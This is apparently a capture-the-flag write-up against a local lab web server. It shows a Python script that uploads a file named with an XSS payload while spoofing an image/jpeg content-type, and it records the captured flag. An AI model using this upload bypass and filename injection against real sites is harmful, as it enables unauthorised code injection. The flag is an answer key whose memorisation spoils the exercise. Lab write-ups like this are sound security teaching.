# http://192.168.99.100/index.php?page=upload

i tried uploading several files to this page via browser and noticed that it only accepts `jpg` images
it also prints the filename once the upload is successfull

here is a little python script i wrote

```py
#!/usr/bin/env python3

import requests

url = 'http://192.168.99.100/?page=upload'

f = { 
        'uploaded':                                 # .. from <form> element in html
            ("<script>alert('xss')</script>",       # file name
                'file_contents',                    # actual file contents, normaly `open(fn, 'rb')`
                'image/jpeg')                       # content-type
        }

d = {
        'Upload': 'Upload'                          # from <form> element in html
        }

r = requests.post(url, files=f, data=d)
print(r.text)
```

upon running the script we get the flag
```sh
e1z2r10p4% python3 upload.py | grep flag
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/script> succesfully uploaded.</pre>
```


the filename i provided is not valid in unix environments because of the `/` in `</script>`, 
if it was, this could be an attack vector, its possible that the filename is valid on windows, but i'm not 100% on this

i think the lesson to be learned here is that the actual contents of the file do not match the `content-type` meta
content-type is set to `image/jpeg` but we're still able to upload files with arbitrary content

#### we have the flag `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`
nice

